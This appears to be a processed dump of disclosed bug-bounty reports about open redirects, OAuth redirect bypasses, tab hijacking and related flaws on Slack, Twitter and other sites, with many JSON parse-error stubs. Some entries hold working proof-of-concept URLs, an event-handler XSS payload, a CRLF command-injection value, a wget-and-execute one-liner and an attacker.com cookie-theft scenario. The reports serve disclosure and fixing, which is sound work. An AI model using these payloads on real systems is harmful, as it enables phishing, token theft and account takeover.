@@ -1,0 +1,3184 @@
+===== RDIR-1429 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-2126 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-2322 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-2414 | open redirect | sev= | bounty=None | substate=informative | weak=Open Redirect | len=292
+1. go to https://www.relateiq.com/sign-up
+2. Fill the form and click on signup free button.
+3. Intercept the request using tamper data and change the 'retURL' parameter to any value like https://google.com (any evil url) and submit the request.
+4. The web app redirect to any evil website.
+
+
+===== RDIR-2575 | Slack OAuth2 "redirect_uri" Bypass  | sev= | bounty=None | substate=resolved | weak=Improper Authentication - Generic | len=1043
+Hi,
+
+I've found a way to circumvent redirect_uri restrictions imposed by the web application using domain-suffix/subdomain technique.
+
+I created an OAuth application under https://api.slack.com/applications/new. That has OAuth redirect_uri configured to http://www.google.com.
+
+So technically 
+
+Allowed Request shall be :
+https://slack.com/oauth/authorize?client_id=2190698099.2192071336&redirect_uri=http://www.google.com
+
+Denied Request shall be:
+
+https://slack.com/oauth/authorize?client_id=2190698099.2192071336&redirect_uri=http://www.blahblah.com
+
+Surprisingly If I point the redirect_uri to http://www.google.com.mx (see .mx suffix) the endpoint will be accepted, infact endpoint like http://www.google.com.attacker.com will be accepted too. The server doesn't block these suffix attacks.
+
+So attackers can craft an OAuth endpoint like below to circumvent redirect_uri restrictions :
+
+https://slack.com/oauth/authorize?client_id=2190698099.2192071336&redirect_uri=http://www.google.com.mx
+
+
+Thanks!
+Prakhar Prasad
+
+
+===== RDIR-2622 | URL redirection flaw | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=494
+An open redirect is an application that takes a parameter and redirects a user to the parameter value without any validation. This vulnerability is used in phishing attacks to get users to visit malicious sites without realizing it.
+
+Steps to reproduce:
+
+1) Go to this URL:
+
+https://slack.com/checkcookie?redir=http://www.likelo.com
+
+Proper checks should be there on the redir parameter that should only allow to redirect on slack.com URL.
+
+Please have a look.
+
+Best regards,
+Anand
+
+
+===== RDIR-2731 | Open redirect vulnerability  | sev= | bounty=None | substate=informative | weak=Open Redirect | len=325
+Hi,
+
+Open redirect issue:
+
+1) Go to this URL:
+
+https://sehacure.slack.com/link?url=http://www.likelo.com
+
+The victim will be redirected.
+
+Impacts:
+
+The attacker can force the user to install trojans,malwares, etc. into his system.
+And can conduct phishing attacks.
+
+Please have a check.
+
+Best regards,
+Anand
+
+
+===== RDIR-2989 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-4521 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-4549 | Open Redirect in Slack | sev= | bounty=None | substate=informative | weak=Open Redirect | len=145
+This link shall redirect to google.co.in: http://prakhar.slack.com/link?url=http%3A%2F%2Fgoogle.co.in
+
+Straight, open redirection!
+
+Thanks!
+
+
+
+===== RDIR-4570 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-5199 | Improper Validation of the Referrer header leading to Open URL Redirection | sev= | bounty=None | substate=informative | weak=Open Redirect | len=1041
+Using a proxy tool such as Burp, set the Target as https://coinbase.com.
+Then, send the following request:
+
+GET /cdn-cgi/l/chk_jschl HTTP/1.1
+Host: coinbase.com
+Referer: http://attacker.com
+Content-Length: 2
+
+Notice the attacker's domain in the Referrer header. This value is not being validated on the server side and as a result, the user is redirected to http://www.attacker.com
+
+Attack Scenario:
+1. An attacker hosts his own website www.attacker.com.
+2. He has a link on this website https://coinbase.com/cdn-cgi/l/chk_jschl.
+3. The attacker tricks a legitimate coinbase user to click on this link.
+4. When the user clicks on the link, he gets redirected to the attacker controlled website.
+5. Now, if the coinbase user is authenticated to the coinbase website in the same browser, all the cookies from the browser are sent to the attacker controlled website.
+6. The attacker now has access to the user's session cookies which he can use to impersonate the coinbase user and take complete control over the user's account.
+
+
+===== RDIR-6035 | open redirect in https://slack.com | sev= | bounty=None | substate=informative | weak=Open Redirect | len=258
+Navigate to Https://slack.com
+append "/link?url=url=http://bing.com" or enter any website of your choice with http://
+vulnerable link https://slack.com/link?url=http://bing.com
+notice that user is redirected to bing.com without being validated or notified
+
+
+===== RDIR-6357 | https://www.khanacademy.org/login open-redirect | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=241
+Hi,
+
+I found a bypass in the redirects :
+`https://www.khanacademy.org/login?continue=http://www.olivierbeg.nl` won't work.
+`https://www.khanacademy.org/login?continue=http:/www.olivierbeg.nl` will work :-)
+
+Best regards,
+
+Olivier Beg
+
+
+===== RDIR-6564 | Open Redirection in SmartHistory KhanAcademy | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=233
+Proof: 
+http://smarthistory.khanacademy.org/assets/images/media/player.swf?displayclick=link&link=http://google.com&file=1.jpg
+
+STEPS:
+Click the link after clicking click the SCREEN and you will be redirected to http://google.com
+
+
+===== RDIR-7357 | Host Header is not validated resulting in Open Redirect | sev= | bounty=100.0 | substate=resolved | weak=Violation of Secure Design Principles | len=1214
+Please see the attached screenshot where I am sending a request to irccloud.com with an invalid HOST header and I am getting redirected to that domain. This is because the HOST header is not validated to ensure that the request is originating from that target host or not.
+
+http://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html http://carlos.bueno.org/2008/06/host-header-injection.html 
+The above links mention 2 different ways to exploit this issue:
+1. web-cache poisoning and/or 
+2. Using alternate channels like password reset emails. 
+
+For the first way, it can be exploited by poisoning a cache with the attacker's domain and then serving that poisoned response to legitimate users, causing them to redirect to the attacker's domain. This attack kind of varies depending on different web servers as they interpret duplicate Host headers in different ways. The attack vectors are very well explained in the above blogs so I don't want to re-iterate them here again. 
+
+For the second way, I verified that the password reset functionality on the IRC Cloud website does not retrieve the Host header when sending emails. But, validating the Host header is always a good practice. 
+
+
+===== RDIR-7731 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-7900 | OAuth open redirect | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=528
+An attacker can use an open redirect vulnerability in the Twitter OAuth process to redirect someone to his/her webpage, while also obtaining the OAuth token and verifier of the victim. 
+
+The vulnerability is right here: https://app.respond.ly/_oauth/twitter/?requestTokenAndRedirect=https://hackerone.com. When someone authorizes their Twitter account using that URL, the redirect will go to https://hackerone.com.
+
+Recommendation: make sure the `requestTokenAndRedirect` paramater only accepts hosts on whitelisted domains.
+
+
+===== RDIR-11209 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-12949 | Open Redirection | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=253
+Try to connect your facebook using this URL
+
+http://www.urbandictionary.com/auth/facebook?origin=http://google.com
+
+after connecting urbandictionary to FB you will be redirected to google.com
+
+and that is bad because hackers can get the auth token
+
+
+===== RDIR-12964 | Open URL Redirection | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=327
+An open redirect is an application that takes a parameter and redirects a user to the parameter value without any validation. This vulnerability is used in phishing attacks to get users to visit malicious sites without realizing it.
+
+Vulnerable Path: http://www.urbandictionary.com/urbanup.php?hostname=http://smsmafia.in
+
+
+
+
+===== RDIR-13553 | Url Redirection | sev= | bounty=None | substate=informative | weak=Open Redirect | len=133
+Hello,
+
+You can redirect to any url with this-
+
+http://staging.fct.li/?url=www.google.com
+
+You need to Whitelist Domains...
+
+
+
+
+===== RDIR-14699 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-15298 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-16718 | Open Redirect login account | sev= | bounty=100.0 | substate=resolved | weak=Open Redirect | len=556
+An open redirect is an application that takes a parameter and redirects a user to the parameter value without any validation. This vulnerability is used in phishing attacks to get users to visit malicious sites without realizing it.
+
+###Reproduction Instructions 
+
+go to `www.[TEAM].slack.com/?redir=llink?url=https://twitter.com/` log in your account on this link then redirect to twitter,google and any webiste you want.
+
+
+###Proof of concept:
+```
+https://asdasda.slack.com/?redir=llink?url=https://twitter.com/
+```
+
+
+Regards,
+Jayson Zabate
+
+
+===== RDIR-17902 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-19948 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-20661 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-22142 | Open Redirect in WordPress Feed Statistics {Affected All Versions} | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=1308
+Hi,
+    Feed Statistics Plugin is vulnerable to Open Redirect and effecting large amount of Websites. Which is the reason it should be patched swiftly. Detail description is given below:
+
+Tested on:
+Wordpress 3.9.1
+
+Vulnerable Plugin:
+Feed Statistics
+
+Plugin Link:
+http://wordpress.org/plugins/wordpress-feed-statistics/
+
+Tested on:
+Firefox 31.0 / Debian, Linux
+
+P.O.C:
+
+http://www.example.com/?feed-stats-url=any+website+in+Base64+Encoding+here
+Like this:
+http://www.example.com/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+Result Redirect to:
+http://www.sooevilsite.com/
+
+P.O.C P.O.C:
+
+http://hesp-news.org/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+https://www.dropboxatwork.com/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+https://starwars.gamona.de/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+https://joyinthisjourney.com/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+http://www.apaixonadosporseries.com.br/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+https://graziasl.com/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+
+Developer site :)
+http://www.chrisfinke.com/?feed-stats-url=aHR0cDovL3d3dy5zb29ldmlsc2l0ZS5jb20v
+
+                Feel free to contact me anytime if there is more info required.
+
+
+===== RDIR-23386 | Redirect while opening links in new tabs | sev= | bounty=500.0 | substate=resolved | weak=Open Redirect | len=2031
+Hello HackerOne,
+
+I'd like to report to you a nice little bug about opening links in new tabs.
+
+When you open a link in a new tab ( target="_blank" ), the page that opens in a new tab can access the initial tab and change it's location using the window.opener property.
+
+POC: 
+http://daniel-tomescu.com/hackerone/landpage.php (just click on the link, don't worry, no harm will be done). 
+
+Don't right-click it and open it in new tab, don't use the mouse wheel to open it, don't Ctrl+Click, just do a normal click on the link.
+
+The javascript code that does all the magic:
+window.opener.location.replace(newURL);
+
+Ways to solve this:
+1. Don't open links from hackerone.com in new tabs using the  target="_blank";
+2. Set the window.opener attribute to null on the new tab before redirecting to the landing page, like this:
+a) open in a new tab hackerone.com/redirect?link=landingpage
+b) use a javascript code: <script>window.opener = null; </script>
+c) redirect to the landing page: <script>window.location.reload(landingpage)</script>
+
+I hope you see why this is dangerous: this method has huge potential for tricking hackerone.com that click on external links from this site to be a victim of a scam page because the redirecting is made in the background, while the user is focused on another tab.
+
+More then that, some browsers like Mozilla for Android don't even display the URL, just the page title, so the user has no way of knowing that he was redirected to a scam page.
+
+If an attacker uses this trick while submitting a bug on hackerone.com/someTarget, he may obtain the logon credentials for a representative of "someTarget" and gain access to his account, private reports submitted by other researchers etc.
+
+Tested on Chrome version 36 (latest version), Firefox for Windows and Android (latest versions). Websites that protect themselves against this kind of attack: google.com websites, twitter.com (they open links in new tabs, but the window.opener property is set to null)
+
+Thank you!
+
+
+
+
+===== RDIR-25160 | Open redirection on secure.phabricator.com | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=405
+Hi,
+
+It is possible to redirect users to malicious websites and steal their Disqus access token (not possible in case of Facebook).
+
+Please have a look at POC video: 
+https://www.dropbox.com/s/41qm7lbj6rg53td/phabricator.mov
+
+Please fix this and let me know if you need any information.  It would be great if you can please copy the vulnerable link from the video.
+
+Best Regards,
+Anand Prakash
+
+
+
+===== RDIR-25334 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-26962 | open redirect in rfc6749 | sev= | bounty=3000.0 | substate=resolved | weak=Open Redirect | len=1997
+OAuth Providers (servers) that strictly follow rfc6749 are vulnerable to open redirect.
+Let me explain, reading [0]
+
+If the request fails due to a missing, invalid, or mismatching
+   redirection URI, or if the client identifier is missing or invalid,
+   the authorization server SHOULD inform the resource owner of the
+   error and MUST NOT automatically redirect the user-agent to the
+   invalid redirection URI.
+
+   If the resource owner denies the access request or if the request
+   fails for reasons other than a missing or invalid redirection URI,
+   the authorization server informs the client by adding the following
+   parameters to the query component of the redirection URI using the
+   "application/x-www-form-urlencoded" format, per Appendix B:
+
+Now let’s assume this.
+I am registering a new client to the victim.com provider. 
+I register redirect uri attacker.com.
+
+According to [0] if I pass e.g. the wrong scope I am redirected back to attacker.com.
+Namely I prepare a url that is in this form:
+
+http://victim.com/authorize?response_type=code&client_id=bc88FitX1298KPj2WS259BBMa9_KCfL3&scope=WRONG_SCOPE&redirect_uri=http://attacker.com
+
+and this is works as an open redirector.
+Of course in the positive case if all the parameters are fine this doesn’t apply since the resource owner MUST approve the app via the consent screen (at least once).
+
+I have notified also this issue to the OAuth mailing list.
+
+See also http://www.ietf.org/mail-archive/web/oauth/current/msg13367.html
+and http://www.ietf.org/mail-archive/web/oauth/current/maillist.html.
+The consensus seems to be that some of the OAuth family spec should be updated... (currently under discussion)
+
+A solution would be to return error 400 rather than redirect to the redirect URI or always show the consent screen (at least once until the app is accepted by the user) even in case of wrong parameter rather than redirect...
+
+[0] https://tools.ietf.org/html/rfc6749#section-4.1.2.1
+
+
+
+===== RDIR-27987 | Window Opener Property Bug | sev= | bounty=None | substate=resolved | weak= | len=664
+The bug mentioned in #23386 is not yet correctly patched I believe.
+
+See, if a user sets his/her profile's website link to a similar page as mentioned in #23386. I mean a page that can manipulate the window.opener property would be able to accomplish similar results as in #23386
+
+**Proof-of-Concept**:
+
+1. Login to HackerOne
+2. Navigate to https://hackerone.com/settings/profile/edit
+3. Set *Website* to https://demo.prakharprasad.com/ga.html
+4. Once someone visits this link from a profile page  (eg. https://hackerone.com/<username->), his opener HackerOne window will be hijacked.
+
+Let me know if you have any questions.
+
+Thanks,
+Prakhar Prasad
+
+
+
+===== RDIR-28865 | Redirect FILTER bypass in report/comment | sev= | bounty=500.0 | substate=resolved | weak=Open Redirect | len=3413
+Hello,
+
+I made few reports recently. But, I guess you did not understand my perspective. As my video recorder is not working, I am explaining everything in written. 
+
+Lately, I reported about 'External Link Warning Bypass to open redirect users' and @michiel attended the report. Actually, the report is combined using 2 bugs to exploit against 'ANY RANDOM VICTIM' against web. It became confusing henceforth. So, I am writing this again and explaining comprehensively.
+
+Strictly FOLLOW the instructions mentioned below.
+==========================================
+
+First :
+=====
+Whenever, user posts a external link on HackerOne via report/comment then the link is passed through 'REDIRECT FILTER'. This 'REDIRECT FILTER' is supposed to prevent victims from getting open redirected. It presents a page with 'Proceed Button', when pressed redirects to external link. It verifies safety of the user clicking the link and give a nice message.
+
+eg. http://www.google.com (Click this link. This link is external so it will passed through 'REDIRECT FILTER' and a 'Proceed button will be presented.')
+
+
+Second:
+=======
+Whenever user posts an internal link. It is trusted and it is not passed through 'REDIRECT FILTER'.
+
+eg. https://hackerone.com (Click this link. This link is not passed through 'REDIRECT FILTER' and will not present a 'Proceed button'.)
+
+
+Third:
+=====
+1. When you will click 1st link(i.e http://google.com) then a page with url='https://hackerone.com/redirect?signature=43cd652c2f1835df993825d00bed0660f498fc42&url=http%3A%2F%2Fwww.google.com'
+will be presented with a 'Proceed button'.
+
+2. Modifying the url in THAT TAB will redirect you to that site. 
+
+eg. Modify the url in the tab to ---> https://hackerone.com/redirect/secure?signature=43cd652c2f1835df993825d00bed0660f498fc42&url=http%3A%2F%2Fwww.google.com
+
+3. This will redirect showing a message.
+
+4. But, WHEN YOU CLICK THE ABOVE LINK. You will be shocked to see that it doesn't get exploited as we expect it to be. It just works when we change the url in the tab.
+
+5. This is because the link is passed through 'REDIRECT FILTER'.
+
+
+
+Fourth:
+======
+Let''s bypass the 'REDIRECT FILTER'.
+
+1. Now, https://hackerone.com is trusted. And is not passed through redirect filter. (Right click and inspect this link, this is not passed through 'REDIRECT FILTER')
+
+2. Now, https://hackerone.com/redirect/secure?signature=43cd652c2f1835df993825d00bed0660f498fc42&url=http%3A%2F%2Fwww.google.com
+This is passed through 'REDIRECT FILTER' as it contains '/redirect'.
+
+3. Bypassing 'REDIRECT FILTER' now.
+
+https://hackerone.com/../redirect/?signature=43cd652c2f1835df993825d00bed0660f498fc42&url=http%3A%2F%2Fwww.google.com
+(Right Click this link and Inspect. You will be shocked to see it bypassed 'REDIRECT FILTER')
+
+Fifth :
+======
+Combining 'Bypassing REDIRECT FILTER' and "Duplicate report 'adding /secure to redirect'" to make an exploit working against any random user of HackerOne.
+
+eg. https://hackerone.com/../redirect/secure?signature=43cd652c2f1835df993825d00bed0660f498fc42&url=http%3A%2F%2Fwww.google.com
+
+(Click this link. And see BOOM ...!)
+This link bypasses 'REDIRECT FILTER' and also have some more impact then all.
+
+
+Once again, STRICTLY FOLLOW THE INSTRUCTIONS TO REPRODUCE.
+Have a good day. :)
+
+I will be happy to hear reply soon on this. :)
+
+Regards,
+Pranav
+
+
+ 
+
+
+===== RDIR-29263 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-29480 | Unvalidated Channel names causes IRC Command Injection | sev= | bounty=300.0 | substate=resolved | weak=Cross-Site Request Forgery (CSRF) | len=757
+IRCCloud does not validate the channel names created by a user causing it to be parsed as an IRC command such as QUIT.
+
+This means the user can have their clients force-closed by a malicious channel name.
+
+This could also lead to other command injections such as forcing the handover of channels to other users for example (not tested).
+
+Here is my PoC of a malicious channel name:
+``#treehouse'){%0a%0dQUIT``
+
+``15:03:49  ⇐ SySTeM quit ([REDACTED_EMAIL]) Client exited
+15:04:02  → SySTeM joined #treehouse'){%0a%0dQUIT ([REDACTED_EMAIL])
+15:04:04  ⇐ SySTeM quit ([REDACTED_EMAIL]) Client exited``
+
+If you require any further information, please let me know.
+
+All the best,
+Richard Clifford
+
+
+===== RDIR-34084 | Bad extended ascii handling in HTTP 301 redirects of t.co | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=786
+This proof of concept is conceived and tested on Linux+bash (because I'm an user), and of course is harmless.
+
+Imagine a tweet or a line in a tutorial that look like this : 
+`wget http://t.co/abP2XEsm82 -O cafe.sh && chmod +x cafe.sh && ./cafe.sh`
+Of course, you'll test the link in a browser to see if the script downloaded is harmless. It's the case. So you copy/paste the whole command in bash and execute it. And here is the issue, because the script previewed and the one downloaded are different.
+
+All the details of the issue are in the script downloaded. I think the correction is easy enough (change the padding of the extended ascii char), but the possibilities of phishing with this bug are big.
+
+Anyway, I'm available if you have any question, @Cqoicebordel or here.
+
+
+===== RDIR-37593 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-38157 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-39198 | [admin.c2fo.com] Open Redirect | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=196
+PoC (FireFox):
+https://admin.c2fo.com///www.google.com/%2e%2e
+
+HTTP Request:
+GET ///www.google.com/%2e%2e HTTP/1.1
+Host: admin.c2fo.com
+
+HTTP Response:
+Location: //www.google.com/%2e%2e/
+
+
+
+===== RDIR-39631 | Open redirection in fabric.io | sev= | bounty=280.0 | substate=resolved | weak=Open Redirect | len=257
+Hi dear, 
+Once the person is logged into his account he can be redirected to any website .
+
+https://www.fabric.io/login?redirect_url=@<payload>
+
+for example : https://www.fabric.io/login?redirect_url=@google.com
+
+Tested on updated firefox and chrome.
+
+
+===== RDIR-42240 | chrome allows POST requests with custom headers using flash + 307 redirect | sev= | bounty=None | substate=resolved | weak= | len=501
+Hi,
+
+well, It was reported directly to google(as It affected specially chrome) https://code.google.com/p/chromium/issues/detail?id=332023 . This vulnerability allowed post request with custom headers be sent to any websites(not respecting same origin policy) which chrome was mainly affected. Don't know if adobe made any code change due to this report and either if this program covers this kind of vulnerabilities, but i'm reporting it anyway.
+
+wonder if this could be eligible for bug bounty ? 
+
+
+===== RDIR-44157 | Open Redirection Security Filter bypassed | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=933
+Hi,
+
+The application is vulnerable to Open Redirection using a basic filter bypass which it was using for security against open redirection.
+
+Here is the vulnerable link:
+https://vimeo.com/tools/edit?image=http://securityidiots.com?vimeocdn.com/.png
+
+Weakness in filter against Open Redirect.: Actually the application is using the below given filters against open redirection.
+1. URL must contain "vimeocdn.com/"
+2. It should end with an image extention for example jpg, png etc
+
+The problem with the above filter can be seen in my payload, as i included both of the requirements and still redirected the user to my url.
+
+Solution : Below changes can be made to the security.
+If "https://f.vimeocdn.com/" is the URL for images then hardcode it and take the rest of input from GET so that in any case we will have "https://f.vimeocdn.com/" before the URL and user wont be able to do a open redirect to any other domain.
+
+
+===== RDIR-44739 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-45513 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-45516 | [zaption.com] Open Redirect | sev= | bounty=None | substate=resolved | weak=Open Redirect | len=251
+PoC:
+http://zaption.com///www.google.com/%2f%2e%2e
+
+HTTP Response:
+> HTTP/1.1 303 See Other
+> Access-Control-Allow-Origin: *
+> Content-Type: text/html; charset=utf-8
+> Date: Wed, 28 Jan 2015 11:10:52 GMT
+> Location: //www.google.com/%2f%2e%2e/
+
+
+===== RDIR-46497 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-46818 | Twitter Card - Parent Window Redirection | sev= | bounty=560.0 | substate=resolved | weak=Cross-site Scripting (XSS) - Generic | len=335
+Hi,
+I was trying to find XSS on another website and I finally did.
+
+After that I tried share this url on Twitter to show website owner, and noticed that I can run javascript on that iframe.
+
+
+Javascript that I used on Twitter Card : 
+
+<script>top.window.location.href="https://google.com.tr"</script>
+
+
+You can watch PoC
+
+
+
+
+===== RDIR-48516 | Redirect URL in /intent/ functionality is not properly escaped | sev= | bounty=None | substate=resolved | weak=Cross-site Scripting (XSS) - Generic | len=5029
+Choose a tweet from a user that the victim follows but not favorited. 
+
+Send the victim message like "Please favorite this: https://twitter.com/intent/favorite?original_referer=%20style%3Dfont-size%3A1000%3Bonautocompleteerror%3Dalert(0)%20onautocomplete%3Dalert(0)%20onwaiting%3Dalert(0)%20onvolumechange%3Dalert(0)%20ontoggle%3Dalert(0)%20ontimeupdate%3Dalert(0)%20onsuspend%3Dalert(0)%20onsubmit%3Dalert(0)%20onstalled%3Dalert(0)%20onshow%3Dalert(0)%20onselect%3Dalert(0)%20onseeking%3Dalert(0)%20onseeked%3Dalert(0)%20onscroll%3Dalert(0)%20onresize%3Dalert(0)%20onreset%3Dalert(0)%20onratechange%3Dalert(0)%20onprogress%3Dalert(0)%20onplaying%3Dalert(0)%20onplay%3Dalert(0)%20onpause%3Dalert(0)%20onmousewheel%3Dalert(0)%20onmouseup%3Dalert(0)%20onmouseover%3Dalert(0)%20onmouseout%3Dalert(0)%20onmousemove%3Dalert(0)%20onmouseleave%3Dalert(0)%20onmouseenter%3Dalert(0)%20onmousedown%3Dalert(0)%20onloadstart%3Dalert(0)%20onloadedmetadata%3Dalert(0)%20onloadeddata%3Dalert(0)%20onload%3Dalert(0)%20onkeyup%3Dalert(0)%20onkeypress%3Dalert(0)%20onkeydown%3Dalert(0)%20oninvalid%3Dalert(0)%20oninput%3Dalert(0)%20onfocus%3Dalert(0)%20onerror%3Dalert(0)%20onended%3Dalert(0)%20onemptied%3Dalert(0)%20ondurationchange%3Dalert(0)%20ondrop%3Dalert(0)%20ondragstart%3Dalert(0)%20ondragover%3Dalert(0)%20ondragleave%3Dalert(0)%20ondragenter%3Dalert(0)%20ondragend%3Dalert(0)%20ondrag%3Dalert(0)%20ondblclick%3Dalert(0)%20oncuechange%3Dalert(0)%20oncontextmenu%3Dalert(0)%20onclose%3Dalert(0)%20onclick%3Dalert(0)%20onchange%3Dalert(0)%20oncanplaythrough%3Dalert(0)%20oncanplay%3Dalert(0)%20oncancel%3Dalert(0)%20onblur%3Dalert(0)%20onabort%3Dalert(0)%20onwebkitfullscreenerror%3Dalert(0)%20onwebkitfullscreenchange%3Dalert(0)%20onwheel%3Dalert(0)%20onselectstart%3Dalert(0)%20onsearch%3Dalert(0)%20onpaste%3Dalert(0)%20oncut%3Dalert(0)%20oncopy%3Dalert(0)%20onbeforepaste%3Dalert(0)%20onbeforecut%3Dalert(0)%20onbeforecopy%3Dalert(0)&tweet_id=440322224407314432 where 440322224407314432 is that tweet id
+
+The problem is original_referer is not escaped if current Referrer is twitter.com. However it's very hard to get Referer like that because t.co is used everywhere and it kills Referers. So we are going to use this functionality itself twice to get proper Header. 
+
+Normally twitter ignores user supplied "original_referer" unless Referer is twitter.com 
+
+When the victim clicks the link it shows a dialog with "Favorite" button which has a hidden field in it:
+ 
+<input type="hidden" name="referer" value="/intent/favorite?original_referer=%20style%3Dfont-size%3A1000%3Bonautocompleteerror%3Dalert(0)%20onautocomplete%3Dalert(0)%20onwaiting%3Dalert(0)%20onvolumechange%3Dalert(0)%20ontoggle%3Dalert(0)%20ontimeupdate%3Dalert(0)%20onsuspend%3Dalert(0)%20onsubmit%3Dalert(0)%20onstalled%3Dalert(0)%20onshow%3Dalert(0)%20onselect%3Dalert(0)%20onseeking%3Dalert(0)%20onseeked%3Dalert(0)%20onscroll%3Dalert(0)%20onresize%3Dalert(0)%20onreset%3Dalert(0)%20onratechange%3Dalert(0)%20onprogress%3Dalert(0)%20onplaying%3Dalert(0)%20onplay%3Dalert(0)%20onpause%3Dalert(0)%20onmousewheel%3Dalert(0)%20onmouseup%3Dalert(0)%20onmouseover%3Dalert(0)%20onmouseout%3Dalert(0)%20onmousemove%3Dalert(0)%20onmouseleave%3Dalert(0)%20onmouseenter%3Dalert(0)%20onmousedown%3Dalert(0)%20onloadstart%3Dalert(0)%20onloadedmetadata%3Dalert(0)%20onloadeddata%3Dalert(0)%20onload%3Dalert(0)%20onkeyup%3Dalert(0)%20onkeypress%3Dalert(0)%20onkeydown%3Dalert(0)%20oninvalid%3Dalert(0)%20oninput%3Dalert(0)%20onfocus%3Dalert(0)%20onerror%3Dalert(0)%20onended%3Dalert(0)%20onemptied%3Dalert(0)%20ondurationchange%3Dalert(0)%20ondrop%3Dalert(0)%20ondragstart%3Dalert(0)%20ondragover%3Dalert(0)%20ondragleave%3Dalert(0)%20ondragenter%3Dalert(0)%20ondragend%3Dalert(0)%20ondrag%3Dalert(0)%20ondblclick%3Dalert(0)%20oncuechange%3Dalert(0)%20oncontextmenu%3Dalert(0)%20onclose%3Dalert(0)%20onclick%3Dalert(0)%20onchange%3Dalert(0)%20oncanplaythrough%3Dalert(0)%20oncanplay%3Dalert(0)%20oncancel%3Dalert(0)%20onblur%3Dalert(0)%20onabort%3Dalert(0)%20onwebkitfullscreenerror%3Dalert(0)%20onwebkitfullscreenchange%3Dalert(0)%20onwheel%3Dalert(0)%20onselectstart%3Dalert(0)%20onsearch%3Dalert(0)%20onpaste%3Dalert(0)%20oncut%3Dalert(0)%20oncopy%3Dalert(0)%20onbeforepaste%3Dalert(0)%20onbeforecut%3Dalert(0)%20onbeforecopy%3Dalert(0)&amp;tweet_id=440322224407314432"> 
+
+The victim sees Return to previous site link and when clicks, it instantly loads the same page with original_referer=Injection.
+
+Injection is inserted "as is" and it can overwrite CSS styles of the link and also inject malicious events in mouseover etc.
+
+Probably there's a better or more reliable way to make XSS payload execute, but I can't find it with blackbox.
+
+How i noticed that? There's another bug i was making a tool for - probing username of current user from given database listening to side channel - twitter does window.close() if the user both follows & favorited this tweet. Demo http://homakov.github.io/twitterdetect.html 
+Not sure if you want to fix that one too? 
+
+
+===== RDIR-49759 | Open Redirect leak of authenticity_token lead to full account take over. | sev= | bounty=1400.0 | substate=resolved | weak=Open Redirect | len=416
+Hey guys
+URL: https://mobile.twitter.com/messages/follow?recipient=/example.com
+when I click 'Follow'
+I will send my POST request to https://example.com
+witch contains my authenticity_token
+that can be used for anything like tweeting, following, sending messages, changing username.,.,.etc
+it can be used too to Add a mobile number, and then steal the account by recovering it by the mobile number.
+Thank You.
+
+
+===== RDIR-50379 | JSON-PARSE-ERROR Expecting value: line 1 column 1 (char 0)
+
+
+===== RDIR-50752 | open redirect sends authenticity_token to any website or (ip address) | sev= | bounty=560.0 | substate=resolved | weak=Open Redirect | len=1055
+Hi,
+URL: https://mobile.twitter.com//example/messages (there is double slash before "example" word)
+when you click "send" after writing a message the authenticity_token will send to https://example
+this URL doesn't allow any dots in it, so i can not write //example.com 
+but when i write a number it will redirect me to an ip, 
+EG:
+https://mobile.twitter.com//0/messages
+>> 0.0.0.0
+when i write a longer number it will redirect me to another ip
+i fount this website that can change server or a website to ip
+https://www.site24x7.com/find-ip-address-of-web-site.html
+then i fount this website that can change any ip to a single number (without dots)
+http://www.smartconversion.com/unit_conversion/IP_Address_Converter.aspx
+so i'll change http://example.com to an ip by the first website
+http://example.com = 93.184.216.34
+now i'll change 93.184.216.34 to a single number without dots by the second website
+93.184.216.34 = 1572395042
+now to redirect from twitter to example.com
+https://mobile.twitter.com//1572395042/messages
+Thank you!
+
+
+
